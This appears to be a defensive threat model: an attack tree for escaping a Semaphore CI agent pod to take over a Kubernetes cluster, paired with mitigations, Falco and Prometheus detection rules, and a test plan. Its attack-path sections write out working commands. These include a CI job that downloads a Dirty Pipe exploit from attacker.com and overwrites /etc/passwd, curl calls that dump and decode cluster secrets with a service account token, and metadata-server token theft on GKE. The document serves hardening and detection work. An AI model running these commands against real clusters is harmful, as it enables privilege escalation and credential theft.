# Attack Tree: Container Escape to Cluster Takeover

## Goal
Gain cluster-admin level access to Kubernetes cluster via container escape from Semaphore agent pod.

## Attack Tree

```
[Root] Compromise Kubernetes Cluster
│
├─[AND]─ Gain Initial Pod Access
│   │
│   ├─[OR]─ Exploit Application Vulnerability
│   │   ├─ Malicious project YAML injection (HIGH)
│   │   ├─ XSS in Front → RCE (MEDIUM)
│   │   └─ SQL injection in ProjectHub → command exec (MEDIUM)
│   │
│   ├─[OR]─ Supply Chain Attack
│   │   ├─ Compromised base image (MEDIUM)
│   │   └─ Malicious dependency in build (LOW)
│   │
│   └─[OR]─ Stolen Credentials
│       ├─ Compromised developer account (MEDIUM)
│       └─ Stolen CI/CD secrets (HIGH)
│
└─[AND]─ Escalate from Pod to Cluster Admin
    │
    ├─[OR]─ Container Escape to Node
    │   │
    │   ├─[AND]─ Privileged Container + Kernel Exploit
    │   │   ├─ Pod runs with privileged: true (BASELINE: YES)
    │   │   ├─ Kernel vulnerability exists (e.g., Dirty Pipe)
    │   │   └─ Exploit PoC available
    │   │
    │   ├─[AND]─ Writable Host Path Mount
    │   │   ├─ Pod mounts /var/run/docker.sock (BASELINE: NO)
    │   │   ├─ Pod mounts /etc or /root (BASELINE: NO)
    │   │   └─ Escape via chroot/pivot_root manipulation
    │   │
    │   ├─[AND]─ CAP_SYS_ADMIN Capability Abuse
    │   │   ├─ Pod has SYS_ADMIN capability (BASELINE: NO)
    │   │   ├─ Use unshare() to create new namespace
    │   │   └─ Mount host filesystem inside namespace
    │   │
    │   └─[AND]─ Node Service Exploitation
    │       ├─ Accessible kubelet API (port 10250)
    │       ├─ Kubelet authentication disabled (BASELINE: NO)
    │       └─ Execute commands on node via kubelet exec API
    │
    ├─[OR]─ RBAC Privilege Escalation
    │   │
    │   ├─[AND]─ Overprivileged ServiceAccount
    │   │   ├─ Pod ServiceAccount can list/read secrets (BASELINE: CHECK)
    │   │   ├─ Extract cluster-admin credentials
    │   │   └─ Authenticate as cluster-admin
    │   │
    │   ├─[AND]─ RoleBinding Manipulation
    │   │   ├─ Pod can create/patch RoleBindings
    │   │   ├─ Grant self cluster-admin role
    │   │   └─ Use new privileges
    │   │
    │   └─[AND]─ Token Injection Attack
    │       ├─ Access to another pod's service account token
    │       ├─ Use stolen token for API access
    │       └─ Escalate via stolen pod's RBAC
    │
    ├─[OR]─ Kubernetes API Exploitation
    │   │
    │   ├─[AND]─ Unauthenticated API Access
    │   │   ├─ API server allows anonymous access (BASELINE: CHECK)
    │   │   ├─ Anonymous user has elevated permissions
    │   │   └─ Create privileged pod with hostPath mounts
    │   │
    │   ├─[AND]─ API Server Vulnerability
    │   │   ├─ Known CVE in Kubernetes version (e.g., CVE-2018-1002105)
    │   │   ├─ Exploit available
    │   │   └─ Cluster running vulnerable version
    │   │
    │   └─[AND]─ etcd Direct Access
    │       ├─ etcd exposed without authentication (BASELINE: NO)
    │       ├─ Read all Kubernetes resources from etcd
    │       └─ Extract secrets, create admin users
    │
    └─[OR]─ Cloud Provider Metadata API Abuse
        │
        ├─[AND]─ GKE Metadata Server Access
        │   ├─ Workload Identity NOT enabled (BASELINE: YES)
        │   ├─ Access node service account via metadata API
        │   ├─ Node SA has compute.instances.* permissions
        │   └─ Use GCP credentials to modify cluster
        │
        └─[AND]─ Instance Metadata IMDSv1
            ├─ SSRF vulnerability in application
            ├─ Access http://169.254.169.254/
            └─ Extract GCP service account credentials
```

## Attack Paths by Likelihood

### Path 1: Malicious Project → Privileged Pod → Kernel Exploit [HIGH RISK]

**Prerequisites:**
- Attacker has Semaphore user account (public platform)
- Agent pods run with `privileged: true` (baseline)
- Recent kernel vulnerability with public exploit

**Attack Steps:**
```bash
# 1. Create malicious project with exploit in .semaphore/semaphore.yml
version: v1.0
name: Exploit Job
agent:
  machine:
    type: e1-standard-2
blocks:
  - name: Container Escape
    task:
      jobs:
      - name: Exploit
        commands:
          - wget https://attacker.com/dirty-pipe-exploit
          - chmod +x dirty-pipe-exploit
          - ./dirty-pipe-exploit /etc/passwd  # Overwrite root password
          - su root  # Now on host, not in container
          - cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token
          - export KUBECONFIG=/etc/kubernetes/kubelet.conf
          - kubectl get secrets --all-namespaces
```

**Baseline Detection:** ❌ None
**Post-Mitigation Detection:**
- ✅ Pod Security Standards block privileged pods
- ✅ Falco detects kernel exploit attempt
- ✅ GKE Shielded Nodes prevent bootkit persistence

---

### Path 2: RBAC Overprovisioning → Secret Access [MEDIUM RISK]

**Prerequisites:**
- Agent pod ServiceAccount has `get secrets` permission across namespaces
- No NetworkPolicy restricts API server access

**Attack Steps:**
```bash
# Inside agent pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# List all secrets in cluster
curl -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets?limit=1000

# Extract database credentials
curl -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/secrets/postgres-credentials \
  | jq -r '.data | map_values(@base64d)'

# Use exfiltrated DB creds to access PostgreSQL from outside cluster
```

**Baseline Detection:** ❌ None (legitimate API calls)
**Post-Mitigation Detection:**
- ✅ NetworkPolicy blocks pod→API server (only Controller needs access)
- ✅ Kubernetes audit logs + Falco detect secret enumeration
- ✅ SIEM correlates secret access + external DB connection

---

### Path 3: GKE Metadata API → Node Service Account [MEDIUM RISK]

**Prerequisites:**
- Workload Identity not configured (default on older GKE)
- Node service account has `iam.serviceAccountTokenCreator` role

**Attack Steps:**
```bash
# Inside compromised pod
# Access GKE metadata server (bypasses Workload Identity if not configured)
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Use node SA token to impersonate application service accounts
gcloud iam service-accounts get-access-token semaphore-admin@PROJECT.iam.gserviceaccount.com

# Use impersonated token to access GCP resources
gsutil ls gs://semaphore-secrets-bucket/
```

**Baseline Detection:** ❌ None
**Post-Mitigation Detection:**
- ✅ Workload Identity enabled (metadata API returns pod SA, not node SA)
- ✅ GCP audit logs detect unauthorized impersonation attempts
- ✅ VPC Flow Logs detect metadata API access

---

## Mitigation Mapping

| Attack Path | Baseline Risk | Security Control | Residual Risk | Phase |
|-------------|---------------|------------------|---------------|-------|
| Privileged pod + kernel exploit | **CRITICAL** | Pod Security Standards (restricted) | LOW | 05 |
| Host path mount escape | **HIGH** | PSS blocks hostPath, readOnlyRootFilesystem | LOW | 05 |
| Overprivileged ServiceAccount | **HIGH** | Least-privilege RBAC, NetworkPolicy | MEDIUM | 02, 08 |
| GKE metadata abuse | **HIGH** | Workload Identity, metadata concealment | LOW | 09 |
| Kubelet API exploit | **MEDIUM** | Node authentication, CIS benchmark hardening | LOW | 02 |
| API server CVE | **MEDIUM** | GKE Autopilot auto-upgrades, vulnerability scanning | LOW | 02 |
| etcd exposure | **LOW** | Managed etcd, encryption at rest | LOW | 02 |

## Detection Signatures

### Falco Rules

```yaml
# Detect container escape attempt via privileged mode
- rule: Detect Privileged Container
  desc: Alert on privileged container startup
  condition: >
    evt.type = container and
    container.privileged = true
  output: "Privileged container started (user=%user.name pod=%k8s.pod.name)"
  priority: WARNING

# Detect kernel exploit indicators
- rule: Kernel Exploit Detected
  desc: Alert on suspicious system calls indicating kernel exploit
  condition: >
    evt.type in (ptrace, process_vm_writev) and
    proc.name in (dirty_pipe, exploit, cve)
  output: "Potential kernel exploit detected (proc=%proc.name)"
  priority: CRITICAL

# Detect service account token theft
- rule: Service Account Token Read
  desc: Alert on reading service account tokens
  condition: >
    open_read and
    fd.name startswith /var/run/secrets/kubernetes.io/serviceaccount
  output: "Process read service account token (proc=%proc.name)"
  priority: WARNING
```

### Prometheus Alerts

```yaml
# Alert on unusual pod creation rate (potential breakout persistence)
- alert: UnusualPodCreationRate
  expr: rate(kube_pod_created[5m]) > 2
  for: 5m
  annotations:
    summary: "High rate of pod creation detected"

# Alert on pods with privileged security context
- alert: PrivilegedPodDetected
  expr: kube_pod_security_context_privileged == 1
  annotations:
    summary: "Privileged pod detected: {{ $labels.pod }}"
```

## Testing Plan

### Test 1: Privileged Pod Rejection
```bash
# Attempt to create privileged pod (should be blocked by PSS)
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: privileged-test
spec:
  containers:
  - name: test
    image: alpine
    securityContext:
      privileged: true
EOF

# Expected result: Pod rejected by admission controller
# Error: pods "privileged-test" is forbidden: violates PodSecurity "restricted:latest"
```

### Test 2: Kernel Exploit Detection
```bash
# Inside agent pod, attempt to exploit (safe POC)
# Download dirty pipe POC that writes to /etc/passwd
./dirty-pipe-poc.sh

# Expected detection:
# 1. Falco alert: "Kernel exploit signatures detected"
# 2. GKE Security Command Center: "Malicious binary executed"
# 3. SIEM correlation: "Container escape attempt detected"
```

### Test 3: ServiceAccount RBAC Test
```bash
# Attempt to list secrets from agent pod
kubectl exec -it deployment/controller -- \
  wget --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/secrets

# Expected result: 403 Forbidden (RBAC denies)
# Expected detection: Kubernetes audit log entry
```

## References

- **Container Escape Techniques:** https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
- **CVE-2022-0847 (Dirty Pipe):** https://dirtypipe.cm4all.com/
- **Kubernetes Privilege Escalation:** https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3
- **GKE Metadata Server Security:** https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity
